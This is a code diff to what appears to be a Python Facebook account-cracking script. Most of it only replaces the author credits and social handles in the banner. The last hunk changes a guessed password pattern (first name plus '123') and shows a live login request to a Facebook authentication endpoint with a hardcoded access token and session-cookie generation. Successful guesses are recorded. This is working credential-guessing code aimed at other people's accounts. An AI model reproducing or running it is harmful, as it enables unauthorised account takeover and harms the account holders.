@@ -56,9 +56,9 @@ logo = """ -----------------------------•◈•
 |__~~~\ •◈•-----█-------⑧-------█------•◈•
 |__~~~\ •◈•-----█-------⑥-------█------•◈•
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;FlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1; Aahilrna4072
+\033[1;96mAuthor  \033[1;93m: \033[1;92mSohail Ahmed
+\033[1;96mInstagram \033[1;93m: \033[1;sohailkbr6
+\033[1;96mFacebook  \033[1;93m: \033[1; sohailkbr6
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/TheSAK/sak
 \033[1;91m======================================="""
 
@@ -80,10 +80,10 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;92mFlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Aahilrana4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/zero
+\033[1;96mAuthor  \033[1;93m: \033[1;92mSohail Ahmed
+\033[1;96mInstagram \033[1;93m: \033[1;92msohailkbr6
+\033[1;96mFacebook  \033[1;93m: \033[1;92m sohailkbr6
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/TheSAK/sak
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
@@ -330,7 +330,7 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = b['first_name'] + '789'
+							pass3 = b['first_name'] + '123'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
